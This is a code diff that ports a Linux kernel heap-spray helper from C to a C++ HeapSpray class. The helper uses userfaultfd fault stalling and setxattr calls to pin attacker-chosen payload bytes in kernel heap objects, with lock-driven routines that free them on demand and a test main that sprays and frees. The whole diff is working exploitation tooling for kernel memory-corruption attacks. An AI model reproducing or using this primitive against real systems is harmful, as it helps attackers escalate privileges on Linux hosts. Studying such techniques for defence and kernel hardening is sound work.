@@ -6,25 +6,13 @@
 #define MIN(X, Y) ((X) >= (Y) ? (Y) : (X))
 #define MAX(X, Y) ((X) >= (Y) ? (X) : (Y))
 
-static int page_size, i=0;
-static pthread_mutex_t order_lock;
-static void *page;
-static void *spray_data[MAX_ROUND] = {0, };
-long g_id = 0;
-
-static int init_userfaultfd(void *addr, char *payload, int size);
-static void *init_pages();
-static void *fault_handler_thread(void *arg);
-static void *spray(void* arg);
-static void *spray_setxattr(void *arg);
-
-
 struct spray_argv {
     void *addr;
     void *page_fault;
     int id;
     int fd;
     int objs_num;
+    HeapSpray *obj;
 };
 
 struct setxattr_argv {
@@ -32,8 +20,13 @@ struct setxattr_argv {
     size_t size;
 };
 
-static void *
-fault_handler_thread(void *arg)
+HeapSpray::HeapSpray()
+{
+    order_lock = (pthread_mutex_t *)malloc(sizeof(pthread_mutex_t));
+}
+
+void *
+HeapSpray::fault_handler_thread(void *arg)
 {
     struct uffd_msg msg;   /* Data read from userfaultfd */
     int fault_cnt = 0;     /* Number of faults so far handled */
@@ -44,9 +37,14 @@ fault_handler_thread(void *arg)
     ssize_t nread;
 
     uffd = ((struct spray_argv*)arg)->fd;
-    page = ((struct spray_argv*)arg)->page_fault;
+    page = (char *)((struct spray_argv*)arg)->page_fault;
     addr = ((struct spray_argv*)arg)->addr;
     id = ((struct spray_argv*)arg)->id;
+    HeapSpray *obj = ((struct spray_argv*)arg)->obj;
+
+#ifdef DEBUG
+    printf("id %d enter fault_handler_thread\n", id);
+#endif
     /* Create a page that will be copied into the faulting region */
 
     /* Loop, handling incoming events on the userfaultfd
@@ -82,8 +80,8 @@ fault_handler_thread(void *arg)
 #ifdef DEBUG
         printf("[+] hang->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
 #endif
-        pthread_mutex_unlock(&order_lock);
-        pthread_mutex_lock(lock[id]); 
+        pthread_mutex_unlock(obj->order_lock);
+        pthread_mutex_lock(obj->lock[id]); 
 #ifdef DEBUG
         printf("[+] unlock->%ld from pagefault [0x%llx-0x%llx]\n", id, msg.arg.pagefault.address-payloadSize, msg.arg.pagefault.address);
 #endif
@@ -96,34 +94,35 @@ fault_handler_thread(void *arg)
           So, round faulting address down to page boundary */
 
         uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
-                                          ~(page_size - 1);
-        uffdio_copy.len = page_size;
+                                          ~(obj->page_size - 1);
+        uffdio_copy.len = obj->page_size;
         uffdio_copy.mode = 0;
         uffdio_copy.copy = 0;
         if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
             errExit("ioctl-UFFDIO_COPY");
 
-        pthread_mutex_unlock(&order_lock);
+        pthread_mutex_unlock(obj->order_lock);
     }
 }
 
-void init_heap_spray(int _objectSize, char* _payload, int _payloadSize) {
+void HeapSpray::init_heap_spray(int _objectSize, char* _payload, int _payloadSize) {
     default_objs_num = OBJS_EACH_ROUND;
-    if (_payloadSize > _objectSize) {
+    if (_payloadSize >= _objectSize) {
         printf("[-] The length of payload should not exceed the object");
         exit(0);
     }
     objectSize = _objectSize;
     payloadSize = _payloadSize;
+
     printf("[+] objectSize: %ld\n", objectSize);
     printf("[+] payloadSize: %ld\n", payloadSize);
 
     fengshuiPayload = (char *)malloc(_payloadSize+1);
     memcpy(fengshuiPayload, _payload, _payloadSize);
-    pthread_mutex_init(&order_lock, NULL);
+    pthread_mutex_init(order_lock, NULL);
 }
 
-void do_heap_spray(int loop) {
+void HeapSpray::do_heap_spray(int loop) {
     if (objectSize == 0) {
         printf("[-] objectSize is zero");
         return;
@@ -140,51 +139,55 @@ void do_heap_spray(int loop) {
     sleep(MAX(1, default_objs_num/50));
 }
 
-static void *spray_setxattr(void *arg) {
+void *HeapSpray::spray_setxattr(void *arg) {
     void *addr = ((struct setxattr_argv*)arg)->value;
     size_t size = ((struct setxattr_argv*)arg)->size;
 
     syscall(__NR_setxattr, "./", "exp", addr, size, 0);
 }
 
-static void *spray(void* arg) {
+void *HeapSpray::spray(void* arg) {
     pthread_t thr;  
     void *addr = ((struct spray_argv*)arg)->addr;
     int s;
     int round = ((struct spray_argv*)arg)->objs_num;
+    HeapSpray *obj = ((struct spray_argv*)arg)->obj;
 
-    s = pthread_create(&thr, NULL, fault_handler_thread, (void *) arg);
+    s = pthread_create(&thr, NULL, (THREADFUNCPTR)&fault_handler_thread, (void *) arg);
     if (s != 0) {
         errno = s;
         errExit("pthread_create");
     }
 
-    struct setxattr_argv *setxattr_arg = malloc(sizeof(struct setxattr_argv));
-    setxattr_arg->size = objectSize;
-    setxattr_arg->value = (void *)(addr + page_size - payloadSize);
+    struct setxattr_argv *setxattr_arg = (struct setxattr_argv *)malloc(sizeof(struct setxattr_argv));
+    setxattr_arg->size = obj->objectSize;
+    setxattr_arg->value = (void *)(addr + obj->page_size - obj->payloadSize);
 
+#ifdef DEBUG
+    printf("going to spray %d round\n", round);
+#endif
     for (int i=0; i<round; i++)
           pthread_create(&thr, NULL, spray_setxattr, (void *) setxattr_arg);
 }
 
-void do_free(u_int64_t val) {
+void HeapSpray::do_free(u_int64_t val) {
     if (val < 512) {
         u_int64_t id = val;
-        pthread_mutex_lock(&order_lock);
+        pthread_mutex_lock(order_lock);
         pthread_mutex_unlock(lock[id]);
 #ifdef DEBUG
         printf("free->%ld\n", id);
 #endif
     } else {
-        void *lock_addr = val;
-        pthread_mutex_lock(&order_lock);
+        pthread_mutex_t *lock_addr = (pthread_mutex_t *)val;
+        pthread_mutex_lock(order_lock);
         pthread_mutex_unlock(lock_addr);
     }
 }
 
-void fork_and_spray(int round, int objs_each_round, int shade, int new_page) {
+void HeapSpray::fork_and_spray(int round, int objs_each_round, int shade, int new_page) {
+    spray_data[0] = init_pages();
     char *payload = (char *)malloc(payloadSize + 1);
-    g_id = 0;
     for (i=0; i < MIN(round, MAX_ROUND); i++) {
         lock[i] = (pthread_mutex_t *)malloc(sizeof(pthread_mutex_t));
         if (new_page)
@@ -214,24 +217,25 @@ void fork_and_spray(int round, int objs_each_round, int shade, int new_page) {
             return; 
         }
         
-        pthread_mutex_lock(&order_lock);
+        pthread_mutex_lock(order_lock);
 #ifdef DEBUG
         printf("id->%d released\n", i);
 #endif
         pthread_mutex_lock(lock[i]);
 
         pthread_t thr;
-        struct spray_argv *arg = malloc(sizeof(struct spray_argv));
+        struct spray_argv *arg = (struct spray_argv *)malloc(sizeof(struct spray_argv));
         arg->id = i;
         arg->addr = spray_data[i];
         arg->fd = uffd;
         arg->page_fault = page;
         arg->objs_num = objs_each_round;
+        arg->obj = this;
         pthread_create(&thr, NULL, spray, (void *) arg);
     }
 }
 
-static void *init_pages() {
+void *HeapSpray::init_pages() {
     page_size = sysconf(_SC_PAGE_SIZE);
     void *base;
 
@@ -242,7 +246,7 @@ static void *init_pages() {
     return addr;
 }
 
-static int init_userfaultfd(void *addr, char *payload, int size) {
+int HeapSpray::init_userfaultfd(void *addr, char *payload, int size) {
     long uffd;                
     unsigned long len;
     struct uffdio_api uffdio_api;
@@ -264,7 +268,7 @@ static int init_userfaultfd(void *addr, char *payload, int size) {
 
     memcpy(addr + page_size - payloadSize, payload, size);
 
-    void *n_addr = (unsigned long) addr + page_size;
+    void *n_addr = (void *)((unsigned long) addr + page_size);
 
     /* Register the memory range of the mapping we just created for
         handling by the userfaultfd object. In mode, we request to track
@@ -278,7 +282,7 @@ static int init_userfaultfd(void *addr, char *payload, int size) {
     return uffd;
 };
 
-void change_payload(char* payload, int size) {
+void HeapSpray::change_payload(char* payload, int size) {
     if (size >= payloadSize) {
         fengshuiPayload = (char *)malloc(size+1);
     }
@@ -289,17 +293,18 @@ void change_payload(char* payload, int size) {
 #ifdef TEST
 int main()
 {
+  HeapSpray hs = HeapSpray();
   char *fengshuiPayload = "\x42\x42\x42\x42\x42\x42\x42\x42";
-  init_heap_spray(128, fengshuiPayload, 8);
-  //do_heap_spray(5);
-  do_spray(10, 0);
-  do_free(1);
-  do_free(2);
-  do_free(3);
-  do_free(4);
-  do_free(5);
+  hs.init_heap_spray(128, fengshuiPayload, 8);
+  //hs.do_heap_spray(5);
+  hs.do_spray(10, 0);
+  hs.do_free(1);
+  hs.do_free(2);
+  hs.do_free(3);
+  hs.do_free(4);
+  hs.do_free(5);
   usleep(500);
-  do_spray(5, 0);
+  hs.do_spray(5, 0);
   sleep(300);
 }
 #endif
